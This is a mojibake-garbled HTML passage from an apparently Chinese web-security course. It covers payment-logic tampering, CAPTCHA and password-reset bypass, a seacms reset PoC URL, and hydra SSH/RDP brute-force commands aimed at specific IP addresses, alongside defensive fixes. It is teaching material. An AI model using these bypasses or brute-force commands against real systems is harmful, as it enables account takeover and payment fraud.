<p>å› ä¸ºæ²¡æœ‰æŠŠè¿™äº›å‚æ•°å›ºå®šæ­»ï¼Œå¯¼è‡´å‡ºç°çš„å®‰å…¨é—®é¢˜</p>
<p>2ã€ä¿®æ”¹å•ä»·è¾¾åˆ°ä»·æ ¼å˜åŠ¨</p>
<p>3ã€ä¿®æ”¹äº§å“è¾¾åˆ°ä½ä»·è´­ä¹°ï¼ˆAäº§å“5400 Bäº§å“6000,é€šè¿‡å°†Aäº§å“æ•°æ®åŒ…ä¸­é™¤ä»·æ ¼å¤–å†…å®¹ä¿®æ”¹ä¸ºBäº§å“ï¼‰</p>
<p>å½“ä¸èƒ½å¯¹æ•°é‡å’Œä»·æ ¼åšä¿®æ”¹çš„æ—¶å€™çš„å¦ä¸€ç§åšæ³•ã€‚</p>
<p>4ã€ä¿®æ”¹æ¥å£è¾¾åˆ°æˆåŠŸè´­ä¹°</p>
<blockquote>
<p>ä¿®æ”¹æ”¯ä»˜æ¥å£ï¼ŒæŠ“åŒ…å¯ä»¥çœ‹åˆ°è¿™ä¸€ç³»åˆ—å‚æ•°å°±æ˜¯ä»£è¡¨çš„æ”¯ä»˜å®æ¥å£ï¼Œå¦‚æœè¯´ä½ æŠŠè¿™ä¸ªæ”¹æˆä½ è‡ªå·±çš„æ”¯ä»˜æ¥å£çš„è¯ï¼Œå°±åƒè¡Œå½“ä¸ä½ æŠŠé’±ä»˜ç»™è‡ªå·±ã€‚ç„¶åæ”¯ä»˜çŠ¶æ€ä¹Ÿæ²¡é—®é¢˜çš„è¯ï¼Œå¯¹æ–¹å°±ä¼šè®¤ä¸ºæˆåŠŸæ”¯ä»˜äº†ã€‚ä½†æ˜¯è¿™ä¸ªæ”¯ä»˜æ¥å£æ˜¯æ¯”è¾ƒéš¾ç”³è¯·çš„ï¼Œå› ä¸ºå…³è”ä¸€äº›æ´—é’±ç›¸å…³çš„é»‘è‰²äº§ä¸šï¼Œæ‰€ä»¥æŠ“çš„æ¯”è¾ƒç´§ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯è¿æ³•è¡Œä¸ºã€‚è¿™é‡Œä¸åšæ¼”ç¤ºï¼ŒçŸ¥é“æœ‰è¿™ä¸ªä¸œè¥¿å°±å¥½ã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ªæ”»å‡»ç‚¹ï¼Œä½†é˜²å¾¡ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯å¯¹æ–¹ä¸è®¤ä½ è¿™ä¸ªæ¥å£ï¼Œå®ƒç›´æ¥åœ¨æºç ä¸­å†™æ¸…æ¥šåªæ¥å—è‡ªå·±çš„æ¥å£ï¼Œæ‰€ä»¥å°±ç®—ä½ æ”¹æˆåŠŸäº†ï¼Œå¹¶ä¸”ä¹Ÿä»˜æ¬¾æˆåŠŸäº†ã€‚å¯¹æ–¹é‚£é‡Œå°±ä¼šæ˜¾ç¤ºè´­ä¹°å¤±è´¥ã€‚</p>
</blockquote>
<h4 id="ä¿®æ”¹æ–¹å¼-è®¢å•å·-æ•°é‡-ä¼˜æƒ åˆ¸"><a href="#ä¿®æ”¹æ–¹å¼-è®¢å•å·-æ•°é‡-ä¼˜æƒ åˆ¸" class="headerlink" title="#ä¿®æ”¹æ–¹å¼-è®¢å•å·&amp;æ•°é‡&amp;ä¼˜æƒ åˆ¸"></a>#ä¿®æ”¹æ–¹å¼-è®¢å•å·&amp;æ•°é‡&amp;ä¼˜æƒ åˆ¸</h4><p>1ã€ä¿®æ”¹æ•°é‡è¾¾åˆ°ä»·æ ¼å˜åŠ¨ï¼ˆæ•°é‡ä¿®æ”¹ä¸º0.001ï¼‰</p>
<p>2ã€ä¿®æ”¹è®¢å•è¾¾åˆ°åº•ä»·è´­ä¹°ï¼ˆä¿®æ”¹è®¢å•ç¼–å·ï¼Œæ¯”å¦‚æœ‰100å’Œ1000000çš„ä¸¤ä¸ªå•ï¼Œä¿®æ”¹ç¼–å·ä½¿ç”¨100å»è´­ä¹°1000000çš„å•ï¼‰</p>
<p>3ã€ä¼˜æƒ åˆ¸é‡æ”¾ä½¿ç”¨&amp;é‡é¢†ä½¿ç”¨</p>
<h4 id="æŸå®ä¾‹-æ¼”ç¤ºç«™äº¤æ˜“æ”¯ä»˜é€»è¾‘å®‰å…¨"><a href="#æŸå®ä¾‹-æ¼”ç¤ºç«™äº¤æ˜“æ”¯ä»˜é€»è¾‘å®‰å…¨" class="headerlink" title="#æŸå®ä¾‹-æ¼”ç¤ºç«™äº¤æ˜“æ”¯ä»˜é€»è¾‘å®‰å…¨"></a>#æŸå®ä¾‹-æ¼”ç¤ºç«™äº¤æ˜“æ”¯ä»˜é€»è¾‘å®‰å…¨</h4><p>å¥‡ä¹ä¸­ä»‹â€“ä¿®æ”¹è®¢å•é‡‘é¢</p>
<h4 id="ä»£ç å®¡è®¡-ä¸šåŠ¡æ”¯ä»˜é€»è¾‘-å®‰å…¨ä¿®å¤"><a href="#ä»£ç å®¡è®¡-ä¸šåŠ¡æ”¯ä»˜é€»è¾‘-å®‰å…¨ä¿®å¤" class="headerlink" title="#ä»£ç å®¡è®¡-ä¸šåŠ¡æ”¯ä»˜é€»è¾‘&amp;å®‰å…¨ä¿®å¤"></a>#ä»£ç å®¡è®¡-ä¸šåŠ¡æ”¯ä»˜é€»è¾‘&amp;å®‰å…¨ä¿®å¤</h4><p>1ã€é‡‘é¢ä»¥æ•°æ®åº“å®šä¹‰ä¸ºå‡†</p>
<p>2ã€è´­ä¹°æ•°é‡é™åˆ¶ä¸ºæ­£æ•´æ•°</p>
<p>3ã€ä¼˜æƒ åˆ¸å›ºå®šä½¿ç”¨ååˆ é™¤</p>
<p>4ã€è®¢å•ç”Ÿæˆåæ£€æµ‹å¯¹åº”å€¼</p>
<h1 id="ç¬¬51å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-éªŒè¯ç è¯†åˆ«-å¤ç”¨-è°ƒç”¨-æ‰¾å›å¯†ç é‡å®šå‘-çŠ¶æ€å€¼"><a href="#ç¬¬51å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-éªŒè¯ç è¯†åˆ«-å¤ç”¨-è°ƒç”¨-æ‰¾å›å¯†ç é‡å®šå‘-çŠ¶æ€å€¼" class="headerlink" title="ç¬¬51å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;éªŒè¯ç è¯†åˆ«&amp;å¤ç”¨&amp;è°ƒç”¨&amp;æ‰¾å›å¯†ç é‡å®šå‘&amp;çŠ¶æ€å€¼"></a>ç¬¬51å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;éªŒè¯ç è¯†åˆ«&amp;å¤ç”¨&amp;è°ƒç”¨&amp;æ‰¾å›å¯†ç é‡å®šå‘&amp;çŠ¶æ€å€¼</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-31"><a href="#çŸ¥è¯†ç‚¹ï¼š-31" class="headerlink" title="#çŸ¥è¯†ç‚¹ï¼š"></a>#çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€æ‰¾å›å¯†ç é€»è¾‘æœºåˆ¶-å›æ˜¾&amp;éªŒè¯ç &amp;æŒ‡å‘</p>
<p>2ã€éªŒè¯ç éªŒè¯å®‰å…¨æœºåˆ¶-çˆ†ç ´&amp;å¤ç”¨&amp;è¯†åˆ«</p>
<p>3ã€æ‰¾å›å¯†ç -å®¢æˆ·ç«¯å›æ˜¾&amp;Response çŠ¶æ€å€¼&amp;ä¿®æ”¹é‡å®šå‘</p>
<p>4ã€éªŒè¯ç æŠ€æœ¯-éªŒè¯ç çˆ†ç ´ï¼ŒéªŒè¯ç å¤ç”¨ï¼ŒéªŒè¯ç è¯†åˆ«ç­‰</p>
<h4 id="è¯¦ç»†ç‚¹ï¼š-11"><a href="#è¯¦ç»†ç‚¹ï¼š-11" class="headerlink" title="#è¯¦ç»†ç‚¹ï¼š"></a>#è¯¦ç»†ç‚¹ï¼š</h4><p>-æ‰¾å›å¯†ç æµç¨‹å®‰å…¨ï¼š</p>
<p>1ã€ç”¨å›æ˜¾çŠ¶æ€åˆ¤æ–­-res å‰ç«¯åˆ¤æ–­ä¸å®‰å…¨</p>
<p>2ã€ç”¨ç”¨æˆ·åé‡å®šå‘-ä¿®æ”¹æ ‡ç¤ºç»•è¿‡éªŒè¯</p>
<p>3ã€éªŒè¯ç å›æ˜¾æ˜¾ç¤º-éªŒè¯ç æ³„æ¼éªŒè¯è™šè®¾</p>
<p>4ã€éªŒè¯ç ç®€å•æœºåˆ¶-éªŒè¯ç è¿‡äºç®€å•çˆ†ç ´</p>
<p>-éªŒè¯ç ç»•è¿‡å®‰å…¨ï¼š</p>
<p>1ã€éªŒè¯ç ç®€å•æœºåˆ¶-éªŒè¯ç è¿‡äºç®€å•çˆ†ç ´</p>
<p>2ã€éªŒè¯ç é‡å¤ä½¿ç”¨-éªŒè¯ç éªŒè¯æœºåˆ¶ç»•è¿‡</p>
<p>3ã€éªŒè¯ç æ™ºèƒ½è¯†åˆ«-éªŒè¯ç å›¾å½¢ç è¢«è¯†åˆ«</p>
<p>4ã€éªŒè¯ç æ¥å£è°ƒç”¨-éªŒè¯ç è§¦å‘æœºåˆ¶æšä¸¾</p>
<h4 id="å®‰å…¨ä¿®å¤æ–¹æ¡ˆï¼š"><a href="#å®‰å…¨ä¿®å¤æ–¹æ¡ˆï¼š" class="headerlink" title="#å®‰å…¨ä¿®å¤æ–¹æ¡ˆï¼š"></a>#å®‰å…¨ä¿®å¤æ–¹æ¡ˆï¼š</h4><p>-æ‰¾å›æœºåˆ¶è¦è¿›è¡Œæ¯ä¸€æ­¥éªŒè¯-é˜²ç»•è¿‡é‡å®šå‘</p>
<p>-æ‰¾å›æœºåˆ¶è¦è¿›è¡ŒæœåŠ¡ç«¯éªŒè¯-é˜² res æ•°æ®ä¿®æ”¹</p>
<p>-æ‰¾å›æœºåˆ¶è¦æ§åˆ¶éªŒè¯ç å®‰å…¨-é˜²éªŒè¯ç æ”»å‡»</p>
<p>-éªŒè¯ç æ¥å£éœ€éªŒè¯åè¢«è°ƒç”¨-é˜²æ¥å£è¢«ä¹±è°ƒç”¨</p>
<p>-éªŒè¯ç å¼•ç”¨æ™ºèƒ½åŒ–äººå·¥åˆ¤æ–­-é˜²éªŒè¯ç è¢«è¯†åˆ«</p>
<p>-éªŒè¯ç é‡‡ç”¨æ—¶é—´æ®µç”Ÿæ•ˆå¤±æ•ˆ-é˜²éªŒè¯ç è¢«å¤ç”¨</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-28"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-28" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>phpun-res å€¼ä¿®æ”¹&amp;éªŒè¯ç å›æ˜¾&amp;çˆ†ç ´</p>
<p>æŸ APP-res å€¼ä¿®æ”¹&amp;éªŒè¯ç æ¥å£è°ƒç”¨&amp;å¤ç”¨</p>
<p>seacms-éªŒè¯ç è¯†åˆ«&amp;æ‰¾å›æœºåˆ¶å¯¹åº”å€¼ä¿®æ”¹</p>
<h4 id="phpun-res-å€¼ä¿®æ”¹-éªŒè¯ç å›æ˜¾-çˆ†ç ´"><a href="#phpun-res-å€¼ä¿®æ”¹-éªŒè¯ç å›æ˜¾-çˆ†ç ´" class="headerlink" title="#phpun-res å€¼ä¿®æ”¹&amp;éªŒè¯ç å›æ˜¾&amp;çˆ†ç ´"></a>#phpun-res å€¼ä¿®æ”¹&amp;éªŒè¯ç å›æ˜¾&amp;çˆ†ç ´</h4><p>1ã€éªŒè¯ç å›æ˜¾ç»‘å®šæ‰‹æœºå·æ—¶éªŒè¯ç å‰ç«¯æ³„æ¼è¢«è·å–<br>åœ¨æäº¤éªŒè¯ç æ—¶ï¼Œè¯·æ±‚åŒ…ä¸­å«æœ‰æ­£ç¡®çš„éªŒè¯ç ï¼Œ<br>æ­¤æ—¶åªéœ€è¦æŠŠæäº¤è¡¨å•ä¸­çš„éªŒè¯ç æ”¹ä¸ºæ­£ç¡®çš„å³å¯ç»•è¿‡ã€‚</p>
<p>2ã€resä¿®æ”¹-ç»‘å®šæ‰‹æœºå·æ—¶ä¿®æ”¹è¿”å›çŠ¶æ€å€¼åˆ¤å®šé€šè¿‡<br>å°†æµè§ˆå™¨è¿”å›ç»™æµè§ˆå™¨çš„æ•°æ®æŠ“åŒ…ï¼ˆé€šè¿‡burp response this requestï¼‰å‘ç°éªŒè¯æ­£ç¡®çš„æ•°æ®åŒ…è¿”å›å€¼ä¸º1ï¼ŒéªŒè¯é”™è¯¯çš„æ•°æ®åŒ…è¿”å›å€¼ä¸º3ï¼Œæ‰€ä»¥ä¿®æ”¹è¿”å›å€¼ä¸º1å³å¯ç»•è¿‡</p>
<p>3ã€éªŒè¯ç çˆ†ç ´çŸ¥é“éªŒè¯ç è§„çŸ©è¿›è¡Œæ— æ¬¡æ•°é™åˆ¶çˆ†ç ´ï¼ˆå»ºç«‹åœ¨éªŒè¯ç æ²¡é”™è¯¯æ¬¡æ•°é™åˆ¶çš„åŸºç¡€ä¸Šï¼‰<br>ä½¿ç”¨brupè‡ªå¸¦çš„çˆ†ç ´æ¨¡å—ï¼ˆä¸å®ç”¨ï¼‰</p>
<h4 id="æŸ-APP-res-å€¼ä¿®æ”¹-éªŒè¯ç æ¥å£è°ƒç”¨-å¤ç”¨"><a href="#æŸ-APP-res-å€¼ä¿®æ”¹-éªŒè¯ç æ¥å£è°ƒç”¨-å¤ç”¨" class="headerlink" title="#æŸ APP-res å€¼ä¿®æ”¹&amp;éªŒè¯ç æ¥å£è°ƒç”¨&amp;å¤ç”¨"></a>#æŸ APP-res å€¼ä¿®æ”¹&amp;éªŒè¯ç æ¥å£è°ƒç”¨&amp;å¤ç”¨</h4><p>res ä¿®æ”¹-æ‰¾å›å¯†ç ä¿®æ”¹è¿”å›çŠ¶æ€å€¼åˆ¤å®šéªŒè¯é€šè¿‡</p>
<p>éªŒè¯ç æ¥å£è°ƒç”¨-æŠ“å½“å‰å‘é€éªŒè¯ç æ•°æ®åŒ…åè°ƒç”¨</p>
<p>æ€è·¯ï¼šå…ˆå°è¯•å‘é€éªŒè¯ç éªŒè¯è¯·æ±‚åŒ…â€“æŠ“åŒ…å¹¶æœªçœ‹åˆ°æ­£ç¡®éªŒè¯ç å­˜åœ¨â€“å°è¯•æŠ“å–éªŒè¯æ­£ç¡®è¿”å›åŒ…å’ŒéªŒè¯é”™è¯¯è¿”å›åŒ…ï¼Œç„¶åå°†é”™è¯¯è¿”å›åŒ…å†…å®¹æ›¿æ¢ä¸ºæ­£ç¡®è¡¨å•å€¼â€“æˆåŠŸç»•è¿‡</p>
<p>éªŒè¯ç å¤ç”¨-æŠ“ç¬¬ä¸€æ¬¡éªŒè¯é€šè¿‡çš„éªŒè¯ç è¿›è¡Œå¤ç”¨</p>
<h4 id="seacms-éªŒè¯ç è¯†åˆ«-æ‰¾å›æœºåˆ¶å¯¹åº”å€¼ä¿®æ”¹"><a href="#seacms-éªŒè¯ç è¯†åˆ«-æ‰¾å›æœºåˆ¶å¯¹åº”å€¼ä¿®æ”¹" class="headerlink" title="#seacms-éªŒè¯ç è¯†åˆ«&amp;æ‰¾å›æœºåˆ¶å¯¹åº”å€¼ä¿®æ”¹"></a>#seacms-éªŒè¯ç è¯†åˆ«&amp;æ‰¾å›æœºåˆ¶å¯¹åº”å€¼ä¿®æ”¹</h4><p>-æ‰¾å›æœºåˆ¶å¯¹åº”å€¼ä¿®æ”¹ï¼š</p>
<p>æ³¨å†Œä¸¤ä¸ªå¸å·ï¼Œå°è¯•æ‰¾å›å¯†ç ï¼Œé‡ç½®è¿æ¥é‡å®šå‘ç»•è¿‡</p>
<p>ä»£ç å®¡è®¡ååˆ†æ Pocï¼š</p>
<p>member.php?mod&#x3D;repsw3&amp;repswcode&#x3D;y&amp;repswname&#x3D;targetUser</p>
<p>-éªŒè¯ç è¯†åˆ«ï¼šxp_CAPTCHA</p>
<p><a href="https://github.com/c0ny1/captcha-killer">https://github.com/c0ny1/captcha-killer</a></p>
<p><a href="https://github.com/smxiazi/NEW_xp_CAPTCHA">https://github.com/smxiazi/NEW_xp_CAPTCHA</a></p>
<p>ä½¿ç”¨ç¯å¢ƒï¼šwindows 10 python3.6.5</p>
<p>å®‰è£…ä½¿ç”¨ï¼šå…·ä½“çœ‹ç›´æ’­æ“ä½œ</p>
<p>1ã€burp å®‰è£… jypython åå¯¼å…¥ py æ–‡ä»¶</p>
<p>2ã€å®‰è£…æ‰€éœ€åº“å python è¿è¡Œ server.py</p>
<p>3ã€æŠ“æ“ä½œæ•°æ®åŒ…åè®¾ç½®å‚æ•°è®¾ç½®å¼•ç”¨</p>
<p>å‚è€ƒæ¡ˆä¾‹ï¼š<a href="https://www.cnblogs.com/punished/p/14746970.html">https://www.cnblogs.com/punished/p/14746970.html</a></p>
<p>åº”ç”¨ï¼šçˆ†ç ´å¯†ç æ—¶ï¼Œæ¥å£è°ƒç”¨æ—¶ï¼Œæµ‹è¯•å…¶ä»–æ—¶ç­‰</p>
<p>éªŒè¯ç è¯†åˆ«è¯¦è§æ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_46343633/article/details/128378686">Brup+Captcha-killer+ddddocrå®ç°éªŒè¯ç è¯†åˆ«</a></p>
<h1 id="ç¬¬52å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-å¼±å£ä»¤å®‰å…¨-ç¤¾å·¥å­—å…¸ç”Ÿæˆ-æœåŠ¡åè®®-Webåº”ç”¨"><a href="#ç¬¬52å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-å¼±å£ä»¤å®‰å…¨-ç¤¾å·¥å­—å…¸ç”Ÿæˆ-æœåŠ¡åè®®-Webåº”ç”¨" class="headerlink" title="ç¬¬52å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;å¼±å£ä»¤å®‰å…¨&amp;ç¤¾å·¥å­—å…¸ç”Ÿæˆ&amp;æœåŠ¡åè®®&amp;Webåº”ç”¨"></a>ç¬¬52å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;å¼±å£ä»¤å®‰å…¨&amp;ç¤¾å·¥å­—å…¸ç”Ÿæˆ&amp;æœåŠ¡åè®®&amp;Webåº”ç”¨</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-32"><a href="#çŸ¥è¯†ç‚¹ï¼š-32" class="headerlink" title="#çŸ¥è¯†ç‚¹ï¼š"></a>#çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€å¼±å£ä»¤å®‰å…¨&amp;é…ç½®&amp;åˆå§‹åŒ–ç­‰</p>
<p>2ã€å¼±å£ä»¤å¯¹è±¡&amp;Web&amp;æœåŠ¡&amp;åº”ç”¨ç­‰</p>
<p>3ã€å¼±å£ä»¤å­—å…¸&amp;æŸ¥è¯¢&amp;åˆ—è¡¨&amp;åˆ—è¡¨ç­‰</p>
<h4 id="å‰ç½®çŸ¥è¯†ï¼š-3"><a href="#å‰ç½®çŸ¥è¯†ï¼š-3" class="headerlink" title="#å‰ç½®çŸ¥è¯†ï¼š"></a>#å‰ç½®çŸ¥è¯†ï¼š</h4><p>å¼±å£ä»¤(weak password) æ²¡æœ‰ä¸¥æ ¼å’Œå‡†ç¡®çš„å®šä¹‰ï¼Œé€šå¸¸è®¤ä¸ºå®¹æ˜“è¢«åˆ«äººï¼ˆä»–ä»¬æœ‰å¯èƒ½</p>
<p>å¯¹ä½ å¾ˆäº†è§£ï¼‰çŒœæµ‹åˆ°æˆ–è¢«ç ´è§£å·¥å…·ç ´è§£çš„å£ä»¤å‡ä¸ºå¼±å£ä»¤ï¼Œé€šå¸¸ä¸ç®¡ç†çš„å®‰å…¨æ„è¯†å’Œå¹³å°</p>
<p>çš„åˆå§‹åŒ–é…ç½®ç­‰ç›¸å…³ï¼Œé€šè¿‡ç³»ç»Ÿå¼±å£ä»¤ï¼Œå¯è¢«é»‘å®¢ç›´æ¥è·å¾—ç³»ç»Ÿæ§åˆ¶æƒé™ã€‚</p>
<p>åœ¨å¸¸è§çš„å®‰å…¨æµ‹è¯•ä¸­ï¼Œå¼±å£ä»¤ä¼šäº§ç”Ÿå®‰å…¨çš„å„ä¸ªé¢†åŸŸï¼ŒåŒ…æ‹¬ Web åº”ç”¨ï¼Œå®‰å…¨è®¾å¤‡ï¼Œå¹³å°</p>
<p>ç»„ä»¶ï¼Œæ“ä½œç³»ç»Ÿç­‰ï¼›å¦‚ä½•è·å–å¼±å£ä»¤ï¼Œåˆ©ç”¨å¼±å£ä»¤æˆä¸ºäº†æ­¤ç±»å®‰å…¨é—®é¢˜çš„å…³é”®ï¼</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-29"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-29" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>ïƒ˜ Web ç±»-åŠ å¯†&amp;éªŒè¯ç åå°çŒœè§£</p>
<p>ïƒ˜ æœåŠ¡ç±»-SSH&amp;RDP è¿œç¨‹ç»ˆç«¯çŒœè§£</p>
<p>ïƒ˜ åº”ç”¨ç±»-ZIP&amp;Word æ–‡ä»¶å‹ç¼©åŒ…çŒœè§£</p>
<p>ïƒ˜ å­—å…¸ç±»-å¯†æ–‡æ”¶é›†&amp;å¼±å£ä»¤&amp;è‡ªå®šä¹‰ç”Ÿæˆ</p>
<h4 id="Web-ç±»-åŠ å¯†-éªŒè¯ç åå°çŒœè§£"><a href="#Web-ç±»-åŠ å¯†-éªŒè¯ç åå°çŒœè§£" class="headerlink" title="#Web ç±»-åŠ å¯†&amp;éªŒè¯ç åå°çŒœè§£"></a>#Web ç±»-åŠ å¯†&amp;éªŒè¯ç åå°çŒœè§£</h4><p><a href="https://github.com/smxiazi/NEW_xp_CAPTCHA">https://github.com/smxiazi/NEW_xp_CAPTCHA</a></p>
<p>-Zblog-å¯†æ–‡ MD5 ä¼ è¾“åŠ å¯†çŒœè§£</p>
<p>Seacms-ç™»å½•éªŒè¯ç è¯†åˆ«çŒœè§£ï¼ˆè¯†åˆ«éªŒè¯ç è¯†åˆ«å·¥å…·ç»•è¿‡éªŒè¯ç è®¤è¯ï¼‰</p>
<h4 id="æœåŠ¡ç±»â€“SSH-RDPè¿œç¨‹ç»ˆç«¯çŒœè§£"><a href="#æœåŠ¡ç±»â€“SSH-RDPè¿œç¨‹ç»ˆç«¯çŒœè§£" class="headerlink" title="#æœåŠ¡ç±»â€“SSH&amp;RDPè¿œç¨‹ç»ˆç«¯çŒœè§£"></a><strong>#æœåŠ¡ç±»â€“SSH&amp;RDPè¿œç¨‹ç»ˆç«¯çŒœè§£</strong></h4><p><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a><br>hydraæ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„çˆ†ç ´å·¥å…·ï¼Œæš´åŠ›ç ´è§£å¼±å¯†ç <br>æ˜¯ä¸€ä¸ªæ”¯æŒä¼—å¤šåè®®çš„çˆ†ç ´å·¥å…·ï¼Œå·²ç»é›†æˆåˆ°KaliLinuxä¸­ï¼Œç›´æ¥åœ¨ç»ˆç«¯æ‰“å¼€å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-s PORTå¯é€šè¿‡è¿™ä¸ªå‚æ•°æŒ‡å®šéé»˜è®¤ç«¯å£ï¼Œ</span><br><span class="line">-i LOGNæŒ‡å®šç ´è§£çš„ç”¨æˆ·ï¼Œå¯¹ç‰¹å®šç”¨æˆ·ç ´è§£ã€‚</span><br><span class="line">-L FILEæŒ‡å®šç”¨æˆ·åå­—å…¸ã€‚</span><br><span class="line">-p PASSå°å†™ï¼ŒæŒ‡å®šå¯†ç ç ´è§£ï¼Œå°‘ç”¨ï¼Œä¸€è‚¡æ˜¯é‡‡ç”¨å¯†ç åºå…¸ã€‚</span><br><span class="line">-P FILEå¤§å†™ï¼ŒæŒ‡å®šå¯†ç å­—å…¸ã€‚</span><br><span class="line">-e nså¯é€‰é€‰é¡¹ï¼Œn:ç©ºå¯†ç è¯•æ¢ï¼Œs:ä½¿ç”¨æŒ‡å®šç”¨æˆ·å’Œå¯†ç è¯•æ¢ã€‚</span><br><span class="line">-C FILEä½¿ç”¨å†’å·åˆ†å‰²æ ¼å¼ï¼Œä¾‹å¦‚â€œç™»å½•åï¼šå¯†ç &quot;æ¥ä»£è•¾LU-På‚æ•°ã€‚</span><br><span class="line">-M FILEæŒ‡å®šç›®æ ‡åˆ—è¡¨æ–‡ä»¶ä¸€è¡Œä¸€æ¡ã€‚</span><br><span class="line">-o FILEæŒ‡å®šç»“æœè¾“å‡ºæ–‡ä»¶ã€‚</span><br><span class="line">-f åœ¨ä½¿ç”¨-Må‚æ•°ä»¥åï¼Œæ‰¾åˆ°ç¬¬ä¸€å¯¹ç™»å½•åæˆ–è€…å¯†ç çš„æ—¶å€™ä¸­æ­¢ç ´è§£ã€‚</span><br><span class="line">-t  TASKSåŒæ—¶è¿è¡Œçš„çº¿ç¨‹æ•°ï¼Œé»˜è®¤ä¸º16.</span><br><span class="line">-w TIMEè®¾ç½®æœ€å¤§è¶…æ—¶çš„æ—¶é—´ï¼Œå•ä½ç§’ï¼Œé»˜è®¤æ˜¯30s.</span><br><span class="line">-v /-Væ˜¾ç¤ºè¯¦ç»†è¿‡ç¨‹ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -I root -P UserPassCombo-Jay.txt -t 5-WV 47.110.73.12 ssh -f</span><br><span class="line">hydra -I administrator-P UserPassCombo-Jay.txt -t 5-WV 47.99.218.105 rdp -f</span><br></pre></td></tr></table></figure>

<h4 id="åº”ç”¨ç±»-ZIP-WORDæ–‡ä»¶å‹ç¼©åŒ…çŒœè§£"><a href="#åº”ç”¨ç±»-ZIP-WORDæ–‡ä»¶å‹ç¼©åŒ…çŒœè§£" class="headerlink" title="#åº”ç”¨ç±»-ZIP&amp;WORDæ–‡ä»¶å‹ç¼©åŒ…çŒœè§£"></a><strong>#åº”ç”¨ç±»-ZIP&amp;WORDæ–‡ä»¶å‹ç¼©åŒ…çŒœè§£</strong></h4><p>PassFab for Word<br>Advanced Archive Password Recovery</p>
<h4 id="å­—å…¸ç±»å¯†æ–‡æ”¶ç¾-å¼±å£ä»¤-è‡ªå®šä¹‰ç”Ÿæˆ"><a href="#å­—å…¸ç±»å¯†æ–‡æ”¶ç¾-å¼±å£ä»¤-è‡ªå®šä¹‰ç”Ÿæˆ" class="headerlink" title="#å­—å…¸ç±»å¯†æ–‡æ”¶ç¾&amp;å¼±å£ä»¤&amp;è‡ªå®šä¹‰ç”Ÿæˆ"></a>#å­—å…¸ç±»å¯†æ–‡æ”¶ç¾&amp;å¼±å£ä»¤&amp;è‡ªå®šä¹‰ç”Ÿæˆ</h4><p><a href="https://monitor.firefox.com/">https://monitor.firefox.com</a><br><a href="https://haveibeenpwned.com/">https://haveibeenpwned.com</a><br><a href="https://www.bugku.com/mima">https://www.bugku.com/mima</a><br><a href="https://github.com/danielmiessler/SecLists%EF%BC%88%E8%BF%91%E5%87%A0%E5%B9%B4%E5%AF%86%E7%A0%81%E4%B9%A0%E6%83%AF%EF%BC%89">https://github.com/danielmiessler/SecListsï¼ˆè¿‘å‡ å¹´å¯†ç ä¹ æƒ¯ï¼‰</a><br><a href="https://github.com/hetianlab/DefaultCreds-cheat-sheet%EF%BC%88%E5%B8%B8%E8%A7%81%E8%AE%BE%E5%A4%87%E5%AF%86%E7%A0%81%EF%BC%89">https://github.com/hetianlab/DefaultCreds-cheat-sheetï¼ˆå¸¸è§è®¾å¤‡å¯†ç ï¼‰</a></p>
<h1 id="ç¬¬53å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-CRLFæ³¨å…¥-URLé‡å®šå‘-èµ„æºå¤„ç†æ‹’ç»æœåŠ¡"><a href="#ç¬¬53å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-CRLFæ³¨å…¥-URLé‡å®šå‘-èµ„æºå¤„ç†æ‹’ç»æœåŠ¡" class="headerlink" title="ç¬¬53å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;CRLFæ³¨å…¥&amp;URLé‡å®šå‘&amp;èµ„æºå¤„ç†æ‹’ç»æœåŠ¡"></a>ç¬¬53å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;CRLFæ³¨å…¥&amp;URLé‡å®šå‘&amp;èµ„æºå¤„ç†æ‹’ç»æœåŠ¡</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-33"><a href="#çŸ¥è¯†ç‚¹ï¼š-33" class="headerlink" title="#çŸ¥è¯†ç‚¹ï¼š"></a>#çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€CRLF æ³¨å…¥-åŸç†&amp;æ£€æµ‹&amp;åˆ©ç”¨</p>
<p>2ã€URL é‡å®šå‘-åŸç†&amp;æ£€æµ‹&amp;åˆ©ç”¨</p>
<p>3ã€Web æ‹’ç»æœåŠ¡-åŸç†&amp;æ£€æµ‹&amp;åˆ©ç”¨</p>
